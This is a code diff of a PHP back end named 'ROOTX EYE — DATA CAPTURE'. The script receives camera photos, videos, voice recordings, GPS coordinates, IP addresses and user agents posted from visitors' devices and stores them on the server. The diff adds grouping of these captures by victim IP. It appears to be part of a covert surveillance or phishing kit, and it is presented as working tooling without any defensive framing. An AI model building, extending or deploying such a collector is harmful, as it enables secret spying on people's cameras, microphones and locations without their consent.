@@ -1,6 +1,7 @@
 <?php
 // ============================================
 // ROOTX EYE — DATA CAPTURE (Admin Panel)
+// TERA ORIGINAL LOOK + IP-BASED GROUPING
 // ============================================
 
 $data_dir = 'data/';
@@ -9,16 +10,15 @@ $captures_file = $data_dir . 'captures.json';
 // Create directory if not exists
 if (!is_dir($data_dir)) {
     mkdir($data_dir, 0777, true);
-    // Create subdirectories for different media types
     mkdir($data_dir . 'photos', 0777, true);
     mkdir($data_dir . 'videos', 0777, true);
     mkdir($data_dir . 'audio', 0777, true);
 }
 
-// Load existing captures
-$captures = [];
+// Load existing data
+$all_data = [];
 if (file_exists($captures_file)) {
-    $captures = json_decode(file_get_contents($captures_file), true) ?: [];
+    $all_data = json_decode(file_get_contents($captures_file), true) ?: [];
 }
 
 // Get data from POST/GET
@@ -29,7 +29,6 @@ $time = date('Y-m-d H:i:s');
 
 // Build capture array
 $capture = [
-    'id' => uniqid(), // ✅ ADDED: Unique ID for each capture
     'type' => $type,
     'ip' => $ip,
     'user_agent' => $user_agent,
@@ -43,7 +42,6 @@ $capture = [
 if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
     $file = $_FILES['file'];
     
-    // Determine extension and subdirectory
     $ext = 'jpg';
     $subdir = 'photos';
     if ($type == 'video') {
@@ -57,12 +55,8 @@ if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
     $filename = $type . '_' . time() . '_' . rand(100, 999) . '.' . $ext;
     $filepath = $data_dir . $subdir . '/' . $filename;
     
-    // Move uploaded file
     if (move_uploaded_file($file['tmp_name'], $filepath)) {
         $capture['file'] = $filepath;
-    } else {
-        // Log error if file move fails
-        error_log("Failed to move uploaded file for type: $type");
     }
 }
 
@@ -72,32 +66,27 @@ if (isset($_POST['lat']) && isset($_POST['lng'])) {
     $capture['lng'] = floatval($_POST['lng']);
 }
 
-// Handle base64 file data (alternative upload method)
-if (isset($_POST['file_data']) && !empty($_POST['file_data']) && empty($capture['file'])) {
-    $file_data = base64_decode($_POST['file_data']);
-    if ($file_data !== false) {
-        $ext = 'jpg';
-        $subdir = 'photos';
-        if ($type == 'video') {
-            $ext = 'mp4';
-            $subdir = 'videos';
-        } elseif ($type == 'voice') {
-            $ext = 'mp3';
-            $subdir = 'audio';
-        }
-        $filename = $type . '_' . time() . '_' . rand(100, 999) . '.' . $ext;
-        $filepath = $data_dir . $subdir . '/' . $filename;
-        if (file_put_contents($filepath, $file_data) !== false) {
-            $capture['file'] = $filepath;
-        }
+// 🔥 IP-BASED GROUPING — SAME IP = SAME USER
+$found = false;
+foreach ($all_data as &$user) {
+    if ($user['ip'] == $ip) {
+        $user['captures'][] = $capture;
+        $found = true;
+        break;
     }
 }
 
-// Add to captures array and save
-$captures[] = $capture;
-file_put_contents($captures_file, json_encode($captures, JSON_PRETTY_PRINT));
+if (!$found) {
+    $all_data[] = [
+        'ip' => $ip,
+        'user_agent' => $user_agent,
+        'first_seen' => $time,
+        'captures' => [$capture]
+    ];
+}
 
-// Return success response
+file_put_contents($captures_file, json_encode($all_data, JSON_PRETTY_PRINT));
+
 header('Content-Type: application/json');
-echo json_encode(['status' => 'success', 'id' => $capture['id']]);
+echo json_encode(['status' => 'success', 'ip' => $ip]);
 ?>
